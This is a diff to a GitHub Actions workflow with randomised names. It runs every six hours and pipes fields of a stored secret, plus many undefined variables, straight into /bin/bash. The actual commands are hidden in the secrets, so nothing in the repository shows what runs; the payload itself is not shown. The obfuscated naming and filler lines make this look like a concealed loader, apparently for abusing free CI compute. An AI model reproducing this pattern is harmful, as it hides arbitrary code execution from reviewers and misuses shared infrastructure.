@@ -3,7 +3,8 @@ name: zimingbn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '10 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +13,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: zimingbn
         env:
-          hvkhi965: ${{ secrets.hvkhi965 }}
+          ris3007: ${{ secrets.ris3007 }}
         run: |
-          echo $hvkhi965 | jq -r .eoh26282 | /bin/bash
-          echo $f3 | jq -r .pbc02800 | /bin/bash
-          echo $zenhr42 | jq -r .fgxmp412 | /bin/bash
-          echo $odp9 | jq -r .phhma7809 | /bin/bash
-          echo $ouyu27026 | jq -r .wgh77000 | /bin/bash
-          echo $edxdm477 | jq -r .ysrf596 | /bin/bash
-          echo $slkl54 | jq -r .tgg420 | /bin/bash
-          echo $cjd717 | jq -r .vo35672 | /bin/bash
-          echo $asoq414 | jq -r .uuntz028 | /bin/bash
+          echo $ris3007 | jq -r .q9 | /bin/bash
+          echo $trs828 | jq -r .ylmj97459 | /bin/bash
+          echo $dtim3929 | jq -r .rnrv40417 | /bin/bash
+          echo $os338 | jq -r .wokw40561 | /bin/bash
+          echo $yhy2 | jq -r .hlw07154 | /bin/bash
+          echo $setcv24 | jq -r .taw9559 | /bin/bash
+          echo $hcb45 | jq -r .sdo9342 | /bin/bash
+          echo $fu4 | jq -r .jio030 | /bin/bash
+          echo $vkc1 | jq -r .b1 | /bin/bash
+          echo $kaygc19935 | jq -r .jemss007 | /bin/bash
+          echo $vvxly890 | jq -r .ovkc6 | /bin/bash
+          echo $k3510 | jq -r .qmh8 | /bin/bash
+          echo $lan5 | jq -r .o05315 | /bin/bash
+          echo $l0 | jq -r .c9 | /bin/bash
+          echo $rhzo111 | jq -r .gcj6168 | /bin/bash
 
